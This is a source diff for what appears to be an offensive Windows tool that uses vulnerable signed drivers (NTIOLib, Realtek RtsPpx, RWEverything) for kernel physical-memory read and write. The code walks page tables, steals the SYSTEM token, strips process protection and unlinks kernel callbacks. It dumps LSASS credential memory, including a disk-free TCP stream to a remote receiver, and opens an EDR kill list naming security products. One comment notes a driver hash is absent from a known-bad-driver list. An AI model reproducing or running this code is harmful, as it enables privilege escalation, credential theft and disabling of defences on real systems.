+        DWORD elemSize = (chunk >= 4) ? 4 : (chunk >= 2) ? 2 : 1;
+        BYTE inBuf[32] = {0};
+        NtiolibReq* req = (NtiolibReq*)inBuf;
+        req->PhysAddr = pa + done;
+        req->ElemSize = elemSize;
+        req->Count = 1;
+        memcpy(inBuf + sizeof(NtiolibReq), (PBYTE)buf + done, elemSize);
+        DWORD got = 0;
+        BOOL ok = DeviceIoControl(g_ntiolibDev, NTIOLIB_IOCTL_PHYS_WRITE,
+            inBuf, sizeof(NtiolibReq) + elemSize, nullptr, 0, &got, nullptr);
+        if (!ok) return false;
+        done += elemSize;
+    }
+    return true;
+}
+
+static QWORD NTIOLib_FindCr3() {
+    for (QWORD pa = 0x1000; pa < 0x1000000; pa += 0x1000) {
+        QWORD pml4[512] = {0};
+        if (!NTIOLib_PhysRead(pa, pml4, sizeof(pml4))) continue;
+        bool selfRef = false;
+        for (int i = 0; i < 512; i++) {
+            QWORD entry = pml4[i];
+            if ((entry & 1) && ((entry & ~0xFFFULL) == pa)) { selfRef = true; break; }
+        }
+        if (selfRef) return pa;
+    }
+    return 0;
+}
+
+static bool NTIOLib_KRead(QWORD va, PVOID buf, SIZE_T size) {
+    PBYTE pCurBuf = (PBYTE)buf;
+    while (size > 0) {
+        QWORD pa = 0;
+        QWORD pml4_idx  = (va >> 39) & 0x1FF;
+        QWORD pdpt_idx  = (va >> 30) & 0x1FF;
+        QWORD pd_idx    = (va >> 21) & 0x1FF;
+        QWORD pt_idx    = (va >> 12) & 0x1FF;
+        QWORD page_off  = va & 0xFFF;
+
+        QWORD pml4e = 0; if (!NTIOLib_PhysRead((g_ntiolibCr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8) || !(pml4e & 1)) return false;
+        QWORD pdpte = 0; if (!NTIOLib_PhysRead((pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8) || !(pdpte & 1)) return false;
+        if (pdpte & 0x80) { pa = (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL); }
+        else {
+            QWORD pde = 0; if (!NTIOLib_PhysRead((pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8) || !(pde & 1)) return false;
+            if (pde & 0x80) { pa = (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL); }
+            else {
+                QWORD pte = 0; if (!NTIOLib_PhysRead((pde & ~0xFFFULL) + pt_idx * 8, &pte, 8) || !(pte & 1)) return false;
+                pa = (pte & ~0xFFFULL) | page_off;
+            }
+        }
+        SIZE_T chunk = std::min(size, (SIZE_T)(0x1000 - page_off));
+        if (!NTIOLib_PhysRead(pa, pCurBuf, (DWORD)chunk)) return false;
+        va      += chunk;
+        pCurBuf += chunk;
+        size    -= chunk;
+    }
+    return true;
+}
+
+static bool NTIOLib_KWrite(QWORD va, PVOID buf, SIZE_T size) {
+    PBYTE pCurBuf = (PBYTE)buf;
+    while (size > 0) {
+        QWORD pa = 0;
+        QWORD pml4_idx  = (va >> 39) & 0x1FF;
+        QWORD pdpt_idx  = (va >> 30) & 0x1FF;
+        QWORD pd_idx    = (va >> 21) & 0x1FF;
+        QWORD pt_idx    = (va >> 12) & 0x1FF;
+        QWORD page_off  = va & 0xFFF;
+
+        QWORD pml4e = 0; if (!NTIOLib_PhysRead((g_ntiolibCr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8) || !(pml4e & 1)) return false;
+        QWORD pdpte = 0; if (!NTIOLib_PhysRead((pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8) || !(pdpte & 1)) return false;
+        if (pdpte & 0x80) { pa = (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL); }
+        else {
+            QWORD pde = 0; if (!NTIOLib_PhysRead((pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8) || !(pde & 1)) return false;
+            if (pde & 0x80) { pa = (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL); }
+            else {
+                QWORD pte = 0; if (!NTIOLib_PhysRead((pde & ~0xFFFULL) + pt_idx * 8, &pte, 8) || !(pte & 1)) return false;
+                pa = (pte & ~0xFFFULL) | page_off;
+            }
+        }
+        SIZE_T chunk = std::min(size, (SIZE_T)(0x1000 - page_off));
+        if (!NTIOLib_PhysWrite(pa, pCurBuf, (DWORD)chunk)) return false;
+        va      += chunk;
+        pCurBuf += chunk;
+        size    -= chunk;
+    }
+    return true;
+}
+
+// ============================================================================
+// RtsPpx (Realtek PCIe card reader proxy) backend
+// Device: \\.\RtsPpx
+// IOCTLs: 0x222000 (read), 0x222008 (write)
+// Input: { physAddr(8), busNum(4), devNum(4), funNum(4), offset(4), [data(1)] }
+// When busNum=devNum=funNum=offset=0, physAddr is read directly via MmMapIoSpace
+// ============================================================================
+#define RTSPPX_IOCTL_READ   0x222000u
+#define RTSPPX_IOCTL_WRITE  0x222008u
+
+#pragma pack(push,1)
+struct RtsPpx_ReadReq {
+    QWORD physAddr;
+    DWORD busNum;
+    DWORD devNum;
+    DWORD funNum;
+    DWORD offset;
+};
+struct RtsPpx_WriteReq {
+    QWORD physAddr;
+    DWORD busNum;
+    DWORD devNum;
+    DWORD funNum;
+    DWORD offset;
+    BYTE  data;
+};
+#pragma pack(pop)
+
+static HANDLE g_rtsPpxDev = INVALID_HANDLE_VALUE;
+static QWORD  g_rtsPpxCr3 = 0;
+
+static bool RtsPpx_PhysRead(QWORD pa, PVOID buf, DWORD size) {
+    if (size == 0) return true;
+    if (g_verbose) printf("[*] RtsPpx_PhysRead: PA=0x%llX, size=%lu\n", pa, size);
+    DWORD done = 0;
+    while (done < size) {
+        DWORD chunk = std::min(size - done, (DWORD)0x1000);
+        // Use combined buffer: request at start, output follows
+        BYTE ioBuf[0x1100]{};
+        RtsPpx_ReadReq* req = (RtsPpx_ReadReq*)ioBuf;
+        req->physAddr = pa + done;
+        req->busNum = 0;
+        req->devNum = 0;
+        req->funNum = 0;
+        req->offset = 0;
+        if (g_verbose) printf("[*]   IOCTL 0x%X, chunk=%lu\n", RTSPPX_IOCTL_READ, chunk);
+        DWORD got = 0;
+        BOOL ok = DeviceIoControl(g_rtsPpxDev, RTSPPX_IOCTL_READ,
+            ioBuf, sizeof(RtsPpx_ReadReq), ioBuf, sizeof(ioBuf), &got, nullptr);
+        if (!ok) {
+            if (g_verbose) printf("[-] RtsPpx_PhysRead failed at PA=0x%llX, err=%lu\n", pa + done, GetLastError());
+            return false;
+        }
+        if (g_verbose) printf("[+]   got %lu bytes\n", got);
+        DWORD take = std::min(chunk, got);
+        memcpy((PBYTE)buf + done, ioBuf, take);
+        done += take;
+        if (got < chunk) break;
+    }
+    return true;
+}
+
+static bool RtsPpx_PhysWrite(QWORD pa, PVOID data, DWORD size) {
+    if (size == 0) return true;
+    DWORD done = 0;
+    while (done < size) {
+        RtsPpx_WriteReq req = { pa + done, 0, 0, 0, 0, *((PBYTE)data + done) };
+        DWORD got = 0;
+        BOOL ok = DeviceIoControl(g_rtsPpxDev, RTSPPX_IOCTL_WRITE,
+            &req, sizeof(req), nullptr, 0, &got, nullptr);
+        if (!ok) {
+            if (g_verbose) printf("[-] RtsPpx_PhysWrite failed at PA=0x%llX, err=%lu\n", pa + done, GetLastError());
+            return false;
+        }
+        done += 1;
+    }
+    return true;
+}
+
+// Helper to check if physical address is in a safe RAM region (avoid MMIO)
+static bool RtsPpx_IsSafeAddr(QWORD pa) {
+    // Skip first 4KB (often problematic)
+    if (pa < 0x1000) return false;
+    // Skip UEFI reserved region (0x100000-0x200000 often problematic on Proxmox)
+    if (pa < 0x400000) return false;  // Skip first 4MB (UEFI/Proxmox reserved regions)
+    // Skip legacy video/ROM area (0xA0000-0x100000)
+    if (pa >= 0xA0000 && pa < 0x100000) return false;
+    // Skip MMIO regions commonly causing issues
+    if (pa >= 0xE0000000 && pa < 0x100000000ULL) return false;  // PCI MMIO
+    if (pa >= 0xFEC00000 && pa < 0xFED00000) return false;  // APIC
+    if (pa >= 0xFED00000 && pa < 0xFEE00000) return false;  // HPET
+    if (pa >= 0xFEE00000 && pa < 0xFEF00000) return false;  // Local APIC
+    if (pa >= 0xFF000000) return false;  // Firmware/ROM
+    return true;
+}
+
+static QWORD RtsPpx_FindCr3() {
+    const QWORD RAM_LIMIT = 0x200000000ULL;
+    auto scan_range = [&](QWORD start, QWORD end) -> QWORD {
+        for (QWORD pa = start; pa < end; pa += 0x1000) {
+            if (!RtsPpx_IsSafeAddr(pa)) continue;  // Skip unsafe regions
+            QWORD e0 = 0;
+            if (!RtsPpx_PhysRead(pa, &e0, 8)) continue;
+            if (!(e0 & 1) || (e0 & 0x80)) continue;
+            QWORD pa0 = e0 & ~0xFFFULL;
+            if (pa0 == 0 || pa0 >= RAM_LIMIT) continue;
+            for (int i = 1; i < 512; i++) {
+                QWORD entry = 0;
+                if (!RtsPpx_PhysRead(pa + (QWORD)i * 8, &entry, 8)) break;
+                if ((entry & 1) && (entry & ~0xFFFULL) == pa)
+                    return pa;
+            }
+        }
+        return 0;
+    };
+    // Start from 1MB to skip legacy regions, most kernels use higher addresses
+    QWORD cr3 = scan_range(0x400000, 0x4000000ULL);
+    if (!cr3) cr3 = scan_range(0x4000000ULL, 0x10000000ULL);
+    return cr3;
+}
+
+static QWORD RtsPpx_Va2Pa(QWORD va) {
+    if (!g_rtsPpxCr3) return 0;
+    QWORD pml4_idx = (va >> 39) & 0x1FF;
+    QWORD pdpt_idx = (va >> 30) & 0x1FF;
+    QWORD pd_idx   = (va >> 21) & 0x1FF;
+    QWORD pt_idx   = (va >> 12) & 0x1FF;
+    QWORD offset   = va & 0xFFF;
+
+    QWORD pml4e = 0; RtsPpx_PhysRead((g_rtsPpxCr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8);
+    if (!(pml4e & 1)) return 0;
+    QWORD pdpte = 0; RtsPpx_PhysRead((pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8);
+    if (!(pdpte & 1)) return 0;
+    if (pdpte & (1ULL << 7)) return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL);
+    QWORD pde = 0; RtsPpx_PhysRead((pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8);
+    if (!(pde & 1)) return 0;
+    if (pde & (1ULL << 7)) return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL);
+    QWORD pte = 0; RtsPpx_PhysRead((pde & ~0xFFFULL) + pt_idx * 8, &pte, 8);
+    if (!(pte & 1)) return 0;
+    return (pte & ~0xFFFULL) | offset;
+}
+
+static bool RtsPpx_KRead(QWORD va, PVOID buf, SIZE_T size) {
+    auto pCurVA  = va;
+    auto pCurBuf = (PUCHAR)buf;
+    while (size > 0) {
+        ULONG_PTR off   = pCurVA & 0xFFF;
+        DWORD     chunk = (DWORD)std::min(size, (SIZE_T)(0x1000 - off));
+        QWORD pa = RtsPpx_Va2Pa(pCurVA);
+        if (!pa) return false;
+        if (!RtsPpx_PhysRead(pa, pCurBuf, chunk)) return false;
+        pCurVA  += chunk;
+        pCurBuf += chunk;
+        size    -= chunk;
+    }
+    return true;
+}
+
+static bool RtsPpx_KWrite(QWORD va, PVOID buf, SIZE_T size) {
+    auto pCurVA  = va;
+    auto pCurBuf = (PUCHAR)buf;
+    while (size > 0) {
+        ULONG_PTR off   = pCurVA & 0xFFF;
+        DWORD     chunk = (DWORD)std::min(size, (SIZE_T)(0x1000 - off));
+        QWORD pa = RtsPpx_Va2Pa(pCurVA);
+        if (!pa) return false;
+        if (!RtsPpx_PhysWrite(pa, pCurBuf, chunk)) return false;
+        pCurVA  += chunk;
+        pCurBuf += chunk;
+        size    -= chunk;
+    }
+    return true;
+}
+
+// ============================================================================
+// RwDrv (RWEverything) backend
+// Device: \\.\fmem3
+// IOCTLs: 0x80002000 (read), 0x80002004 (write)
+// Known driver from RWEverything, novel hash not on loldrivers
+// ============================================================================
+#define RWDRV_IOCTL_READ  0x80002000u
+#define RWDRV_IOCTL_WRITE 0x80002004u
+
+#pragma pack(push,1)
+struct RwDrv_RWReq {
+    QWORD physAddr;
+    DWORD size;
+    DWORD reserved;
+};
+#pragma pack(pop)
+
+static HANDLE g_rwDrvDev = INVALID_HANDLE_VALUE;
+static QWORD  g_rwDrvCr3 = 0;
+
+static bool RwDrv_PhysRead(QWORD pa, PVOID buf, DWORD size) {
+    if (size == 0) return true;
+    if (g_verbose) printf("[*] RwDrv_PhysRead: PA=0x%llX, size=%lu\n", pa, size);
+    DWORD done = 0;
+    while (done < size) {
+        DWORD chunk = std::min(size - done, (DWORD)0x1000);
+        RwDrv_RWReq req = { pa + done, chunk, 0 };
+        BYTE outBuf[0x1000]{};
+        DWORD got = 0;
+        BOOL ok = DeviceIoControl(g_rwDrvDev, RWDRV_IOCTL_READ,
+            &req, sizeof(req), outBuf, chunk, &got, nullptr);
+        if (!ok) {
+            if (g_verbose) printf("[-] RwDrv_PhysRead failed at PA=0x%llX, err=%lu\n", pa + done, GetLastError());
+            return false;
+        }
+        DWORD take = std::min(chunk, got);
+        memcpy((PBYTE)buf + done, outBuf, take);
+        done += take;
+        if (got < chunk) break;
+    }
+    return true;
+}
+
+static bool RwDrv_PhysWrite(QWORD pa, PVOID data, DWORD size) {
+    if (size == 0) return true;
+    if (g_verbose) printf("[*] RwDrv_PhysWrite: PA=0x%llX, size=%lu\n", pa, size);
+    DWORD done = 0;
+    while (done < size) {
+        DWORD chunk = std::min(size - done, (DWORD)0x1000);
+        // Build combined buffer: request struct + data to write
+        BYTE ioBuf[0x1100]{};
+        RwDrv_RWReq* req = (RwDrv_RWReq*)ioBuf;
+        req->physAddr = pa + done;
+        req->size = chunk;
+        req->reserved = 0;
+        memcpy(ioBuf + sizeof(RwDrv_RWReq), (PBYTE)data + done, chunk);
+        DWORD got = 0;
+        BOOL ok = DeviceIoControl(g_rwDrvDev, RWDRV_IOCTL_WRITE,
+            ioBuf, sizeof(RwDrv_RWReq) + chunk, nullptr, 0, &got, nullptr);
+        if (!ok) {
+            if (g_verbose) printf("[-] RwDrv_PhysWrite failed at PA=0x%llX, err=%lu\n", pa + done, GetLastError());
+            return false;
+        }
+        done += chunk;
+    }
+    return true;
+}
+
+// Helper to check if physical address is in a safe RAM region (avoid MMIO)
+static bool RwDrv_IsSafeAddr(QWORD pa) {
+    if (pa < 0x1000) return false;
+    // Skip UEFI reserved region (0x100000-0x200000 often problematic on Proxmox)
+    if (pa < 0x400000) return false;  // Skip first 4MB (UEFI/Proxmox reserved regions)
+    if (pa >= 0xA0000 && pa < 0x100000) return false;
+    if (pa >= 0xE0000000 && pa < 0x100000000ULL) return false;
+    if (pa >= 0xFEC00000 && pa < 0xFEF00000) return false;
+    if (pa >= 0xFF000000) return false;
+    return true;
+}
+
+static QWORD RwDrv_FindCr3() {
+    const QWORD RAM_LIMIT = 0x200000000ULL;
+    auto scan_range = [&](QWORD start, QWORD end) -> QWORD {
+        for (QWORD pa = start; pa < end; pa += 0x1000) {
+            if (!RwDrv_IsSafeAddr(pa)) continue;
+            QWORD e0 = 0;
+            if (!RwDrv_PhysRead(pa, &e0, 8)) continue;
+            if (!(e0 & 1) || (e0 & 0x80)) continue;
+            QWORD pa0 = e0 & ~0xFFFULL;
+            if (pa0 == 0 || pa0 >= RAM_LIMIT) continue;
+            for (int i = 1; i < 512; i++) {
+                QWORD entry = 0;
+                if (!RwDrv_PhysRead(pa + (QWORD)i * 8, &entry, 8)) break;
+                if ((entry & 1) && (entry & ~0xFFFULL) == pa)
+                    return pa;
+            }
+        }
+        return 0;
+    };
+    QWORD cr3 = scan_range(0x400000, 0x4000000ULL);
+    if (!cr3) cr3 = scan_range(0x4000000ULL, 0x10000000ULL);
+    return cr3;
+}
+
+static QWORD RwDrv_Va2Pa(QWORD va) {
+    if (!g_rwDrvCr3) return 0;
+    QWORD pml4_idx = (va >> 39) & 0x1FF;
+    QWORD pdpt_idx = (va >> 30) & 0x1FF;
+    QWORD pd_idx   = (va >> 21) & 0x1FF;
+    QWORD pt_idx   = (va >> 12) & 0x1FF;
+    QWORD offset   = va & 0xFFF;
+
+    QWORD pml4e = 0; RwDrv_PhysRead((g_rwDrvCr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8);
+    if (!(pml4e & 1)) return 0;
+    QWORD pdpte = 0; RwDrv_PhysRead((pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8);
+    if (!(pdpte & 1)) return 0;
+    if (pdpte & 0x80) return (pdpte & 0xFFFFFC0000000ULL) + (va & 0x3FFFFFFF);
+    QWORD pde = 0; RwDrv_PhysRead((pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8);
+    if (!(pde & 1)) return 0;
+    if (pde & 0x80) return (pde & 0xFFFFFFE00000ULL) + (va & 0x1FFFFF);
+    QWORD pte = 0; RwDrv_PhysRead((pde & ~0xFFFULL) + pt_idx * 8, &pte, 8);
+    if (!(pte & 1)) return 0;
+    return (pte & ~0xFFFULL) + offset;
+}
+
+static bool RwDrv_KRead(QWORD addr, PVOID buf, SIZE_T size) {
+    PBYTE pCurBuf = (PBYTE)buf;
+    QWORD pCurVA  = addr;
+    while (size > 0) {
+        DWORD chunk = (DWORD)std::min<SIZE_T>(size, 0x1000 - (pCurVA & 0xFFF));
+        QWORD pa = RwDrv_Va2Pa(pCurVA);
+        if (!pa || !RwDrv_PhysRead(pa, pCurBuf, chunk)) return false;
+        pCurVA  += chunk;
+        pCurBuf += chunk;
+        size    -= chunk;
+    }
+    return true;
+}
+
+static bool RwDrv_KWrite(QWORD addr, PVOID buf, SIZE_T size) {
+    PBYTE pCurBuf = (PBYTE)buf;
+    QWORD pCurVA  = addr;
+    while (size > 0) {
+        DWORD chunk = (DWORD)std::min<SIZE_T>(size, 0x1000 - (pCurVA & 0xFFF));
+        QWORD pa = RwDrv_Va2Pa(pCurVA);
+        if (!pa || !RwDrv_PhysWrite(pa, pCurBuf, chunk)) return false;
+        pCurVA  += chunk;
+        pCurBuf += chunk;
+        size    -= chunk;
+    }
+    return true;
+}
+
 static ProviderType g_activeProvider;
 
 static bool KRead(QWORD addr, PVOID buf, SIZE_T size) {
@@ -743,6 +1603,11 @@ static bool KRead(QWORD addr, PVOID buf, SIZE_T size) {
     case ProviderType::BiosTool: return BiosTool_KRead(addr, buf, size);
     case ProviderType::Ktapi:    return Ktapi_KRead(addr, buf, size);
     case ProviderType::PdfwKrnl: return PdfwKrnl_KRead(addr, buf, (DWORD)size);
+    case ProviderType::IocDrv:   return IocDrv_KRead(addr, buf, size);
+    case ProviderType::AsIO3:    return Asio3_KRead(addr, buf, size);
+    case ProviderType::NTIOLib:  return NTIOLib_KRead(addr, buf, size);
+    case ProviderType::RtsPpx:   return RtsPpx_KRead(addr, buf, size);
+    case ProviderType::RwDrv:    return RwDrv_KRead(addr, buf, size);
     default: return false;
     }
 }
@@ -752,6 +1617,11 @@ static bool KWrite(QWORD addr, PVOID buf, SIZE_T size) {
     case ProviderType::BiosTool: return BiosTool_KWrite(addr, buf, size);
     case ProviderType::Ktapi:    return Ktapi_KWrite(addr, buf, size);
     case ProviderType::PdfwKrnl: return PdfwKrnl_KWrite(addr, buf, (DWORD)size);
+    case ProviderType::IocDrv:   return IocDrv_KWrite(addr, buf, size);
+    case ProviderType::AsIO3:    return Asio3_KWrite(addr, buf, size);
+    case ProviderType::NTIOLib:  return NTIOLib_KWrite(addr, buf, size);
+    case ProviderType::RtsPpx:   return RtsPpx_KWrite(addr, buf, size);
+    case ProviderType::RwDrv:    return RwDrv_KWrite(addr, buf, size);
     default: return false;
     }
 }
@@ -762,9 +1632,6 @@ static QWORD KReadQword(QWORD addr) {
     return v;
 }
 
-// ---------------------------------------------------------------------------
-// Offset scanning
-// ---------------------------------------------------------------------------
 static bool LooksLikeName(QWORD eproc, QWORD off) {
     BYTE b[16]{};
     if (!KRead(eproc + off, b, 16)) return false;
@@ -779,8 +1646,6 @@ static bool LooksLikeName(QWORD eproc, QWORD off) {
 static bool LooksLikeProtection(QWORD eproc, QWORD off) {
     BYTE b = 0xFF;
     if (!KRead(eproc + off, &b, 1)) return false;
-    // Valid PS_PROTECTION: Type (bits 0-1) in {0,1,2}, bits 2-3 must be 0,
-    // Signer (bits 4-7) in {0..7}. Covers all real values 0x00..0x72.
     return b <= 0x72 && (b & 0x0C) == 0 && (b & 0x03) <= 2;
 }
 
@@ -806,9 +1671,6 @@ static void ScanAndFixOffsets(QWORD eproc, DWORD pid) {
     }
 }
 
-// ---------------------------------------------------------------------------
-// Kernel base + System EPROCESS
-// ---------------------------------------------------------------------------
 static QWORD PsISPOffset() {
     HMODULE ntos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
     if (!ntos) return 0;
@@ -833,9 +1695,6 @@ static KernelBase GetKernelBase() {
     return r;
 }
 
-// ---------------------------------------------------------------------------
-// Process walker
-// ---------------------------------------------------------------------------
 static QWORD FindEprocessByPid(QWORD sysEproc, DWORD pid, char name[16]) {
     QWORD head  = sysEproc + g_off.ActiveProcessLinks;
     QWORD flink = KReadQword(head);
@@ -866,9 +1725,6 @@ static QWORD FindEprocessByName(QWORD sysEproc, const char* target) {
     return 0;
 }
 
-// ---------------------------------------------------------------------------
-// Token steal
-// ---------------------------------------------------------------------------
 static bool TokenSteal(QWORD sysEproc, DWORD targetPid) {
     QWORD sysToken = KReadQword(sysEproc + g_off.Token) & ~0xFULL;
     if (!sysToken) { printf("[-] Failed to read SYSTEM token\n"); return false; }
@@ -891,9 +1747,6 @@ static bool TokenSteal(QWORD sysEproc, DWORD targetPid) {
     return true;
 }
 
-// ---------------------------------------------------------------------------
-// ntoskrnl export resolver
-// ---------------------------------------------------------------------------
 static QWORD FindNtosExport(QWORD ntosBase, const char* symName) {
     DWORD peOff = 0;
     KRead(ntosBase + 0x3C, &peOff, 4);
@@ -928,9 +1781,6 @@ static QWORD FindNtosExport(QWORD ntosBase, const char* symName) {
     return 0;
 }
 
-// ---------------------------------------------------------------------------
-// ObCallback operations
-// ---------------------------------------------------------------------------
 static void UnlinkCallbackList(const char* typeName, QWORD listHead) {
     QWORD flink = KReadQword(listHead);
     if (flink == listHead || !flink) {
@@ -1013,9 +1863,6 @@ static bool ListCallbacks(QWORD ntosBase) {
     return true;
 }
 
-// ---------------------------------------------------------------------------
-// CR3-based physical process memory access (for --dump-kernel)
-// ---------------------------------------------------------------------------
 static QWORD Cr3VaToPa(QWORD cr3, QWORD va) {
     QWORD pml4_idx = (va >> 39) & 0x1FF;
     QWORD pdpt_idx = (va >> 30) & 0x1FF;
@@ -1054,9 +1901,6 @@ static bool PhysReadProcessMemory(QWORD cr3, QWORD va, PVOID buf, SIZE_T size) {
     return true;
 }
 
-// ---------------------------------------------------------------------------
-// PPL operations
-// ---------------------------------------------------------------------------
 struct PplResult { bool ok; QWORD eproc; BYTE before; char name[16]; };
 
 static PplResult StripPpl(QWORD sysEproc, DWORD pid, bool dryRun, bool clearSigLevel = false) {
@@ -1095,7 +1939,6 @@ static PplResult StripPpl(QWORD sysEproc, DWORD pid, bool dryRun, bool clearSigL
     return r;
 }
 
-// Restore all three protection bytes (used after MiniDumpWriteDump).
 static void RestorePpl(QWORD eproc, BYTE protection, BYTE sigLevel, BYTE secSigLevel) {
     KWrite(eproc + g_off.Protection - 2, &sigLevel,    1);
     KWrite(eproc + g_off.Protection - 1, &secSigLevel, 1);
@@ -1105,7 +1948,6 @@ static void RestorePpl(QWORD eproc, BYTE protection, BYTE sigLevel, BYTE secSigL
     printf("[*] Protection restored: 0x%02X (verify: 0x%02X)\n", protection, check);
 }
 
-// Set PPL: type=Protected(2), signer=WinSystem(6) -> Protection byte = 0x62
 static bool PplAdd(QWORD sysEproc, DWORD pid) {
     char nm[16]{};
     QWORD ep = FindEprocessByPid(sysEproc, pid, nm);
@@ -1115,7 +1957,6 @@ static bool PplAdd(QWORD sysEproc, DWORD pid) {
     BYTE cur = 0; KRead(ep + g_off.Protection, &cur, 1);
     printf("[*] Current Protection: 0x%02X\n", cur);
 
-    // PS_PROTECTION: Level = (Signer<<4) | (Type) = (6<<4) | 2 = 0x62
     BYTE ppl = 0x62;
     if (!KWrite(ep + g_off.Protection, &ppl, 1)) {
         printf("[-] KWrite Protection failed\n"); return false;
@@ -1125,9 +1966,6 @@ static bool PplAdd(QWORD sysEproc, DWORD pid) {
     return (check == ppl);
 }
 
-// ---------------------------------------------------------------------------
-// Process finder
-// ---------------------------------------------------------------------------
 static DWORD FindPidByName(const char* name) {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return 0;
@@ -1142,9 +1980,6 @@ static DWORD FindPidByName(const char* name) {
     return pid;
 }
 
-// ---------------------------------------------------------------------------
-// LSASS dump - MiniDumpWriteDump path (deprecated: use --dump-rpm instead)
-// ---------------------------------------------------------------------------
 static bool DumpLsass(DWORD pid, const char* outPath, bool noXor, BYTE xorKey = 0x55) {
     EnablePrivilege("SeDebugPrivilege");
 
@@ -1211,9 +2046,6 @@ static bool DumpLsass(DWORD pid, const char* outPath, bool noXor, BYTE xorKey = 
     return sz.QuadPart > 0;
 }
 
-// ---------------------------------------------------------------------------
-// LSASS dump - ReadProcessMemory path
-// ---------------------------------------------------------------------------
 static bool DumpRpm(DWORD pid, const char* outPath) {
     EnablePrivilege("SeDebugPrivilege");
     HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
@@ -1252,9 +2084,6 @@ static bool DumpRpm(DWORD pid, const char* outPath) {
     return totalBytes > 0;
 }
 
-// ---------------------------------------------------------------------------
-// LSASS dump - TCP streaming (disk-free)
-// ---------------------------------------------------------------------------
 static bool DumpRpmTcp(DWORD pid, const char* recvIp, int recvPort) {
     EnablePrivilege("SeDebugPrivilege");
     HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
@@ -1326,9 +2155,6 @@ static bool DumpRpmTcp(DWORD pid, const char* recvIp, int recvPort) {
     return totalBytes > 0;
 }
 
-// ---------------------------------------------------------------------------
-// Kernel-direct dump via CR3 page walk
-// ---------------------------------------------------------------------------
 static bool DumpKernel(QWORD sysEproc, DWORD pid, const char* outPath) {
     char nm[16]{};
     QWORD lsassEp = FindEprocessByPid(sysEproc, pid, nm);
@@ -1338,7 +2164,6 @@ static bool DumpKernel(QWORD sysEproc, DWORD pid, const char* outPath) {
     printf("[*] LSASS EPROCESS: 0x%llX  CR3: 0x%llX\n", lsassEp, cr3);
     if (!cr3) { printf("[-] CR3 read returned 0\n"); return false; }
 
-    // Try to find user-mode CR3 (KPTI shadow PML4)
     static const DWORD ucrOffsets[] = { 0x388, 0x280, 0x3B8, 0x028 };
     QWORD useCr3 = cr3;
     for (DWORD off : ucrOffsets) {
@@ -1355,7 +2180,6 @@ static bool DumpKernel(QWORD sysEproc, DWORD pid, const char* outPath) {
     if (useCr3 == cr3)
         printf("[!] Using kernel CR3 - user-mode pages may not all translate\n");
 
-    // Need a query handle to enumerate regions
     typedef NTSTATUS(NTAPI* NtQVM_t)(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     auto NtQVM = (NtQVM_t)GetProcAddress(ntdll, "NtQueryVirtualMemory");
@@ -1385,7 +2209,6 @@ static bool DumpKernel(QWORD sysEproc, DWORD pid, const char* outPath) {
     while (!earlyStop && addr < 0x7FFFFFFFFFFF00ULL) {
         NTSTATUS st = NtQVM(hProc, (PVOID)addr, 0, &mbi, sizeof(mbi), &retLen);
         if (!NT_SUCCESS(st)) break;
-        // Include MEM_PRIVATE, MEM_MAPPED, and MEM_IMAGE - all committed readable regions
         if (mbi.State == MEM_COMMIT &&
             (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READ |
                             PAGE_EXECUTE_READWRITE | PAGE_READONLY)) &&
@@ -1419,118 +2242,72 @@ static bool DumpKernel(QWORD sysEproc, DWORD pid, const char* outPath) {
     return regions > 0;
 }
 
-// ---------------------------------------------------------------------------
-// EDR kill - full process list (merged from UsingBYOVD)
-// ---------------------------------------------------------------------------
 static const char* kEdrProcs[] = {
-    // Acronis
     "acronis_agent.exe","BackupAndRecoveryAgent.exe","managementagenthost.exe","mms.exe",
-    // AlienVault
     "alienvault-agent.exe","osqueryd.exe",
-    // Avast
     "afwServ.exe","aswEngSrv.exe","aswidsagent.exe","aswToolsSvc.exe",
     "AvastSvc.exe","AvastUI.exe","bccavsvc.exe","wsc_proxy.exe",
-    // AVG
     "AVGUI.exe","AVGSvc.exe","avgnt.exe","avgsvca.exe","avgToolsSvc.exe",
-    // Binary Defense
     "BinaryDefenseAgent.exe",
-    // Bitdefender
     "Arrakis3.exe","BDAvScanner.exe","BDFsTray.exe","BDFileServer.exe","BDLived2.exe",
     "BDLogger.exe","BDScheduler.exe","BDStatistics.exe","bdagent.exe","bdemsrv.exe",
     "bdntwrk.exe","bdredline.exe","bdregsvr2.exe","bdservicehost.exe",
-    // Blumira
     "BlumiraAgent.exe",
-    // Carbon Black
     "cb.exe","cbcomms.exe","cbdefense.exe","carbonsensor.exe","RepMgr.exe",
-    // Cisco Talos
     "cfrutil.exe","cisco_amp_connector.exe","immunet.exe",
-    // CrowdStrike
     "CSFalconContainer.exe","CSFalconService.exe","CSFalconUI.exe",
     "csfalcondataprotect.exe","REPRSVC.EXE",
-    // Cynet
     "CynetEPS.exe","CynetMS.exe","CynetSvc.exe",
-    // Cybereason
     "ActiveConsole.exe","cybereason.exe","CybereasonActiveProbe.exe","CybereasonCR.exe",
-    // Cylance / BlackBerry
     "CylanceSvc.exe",
-    // Darktrace
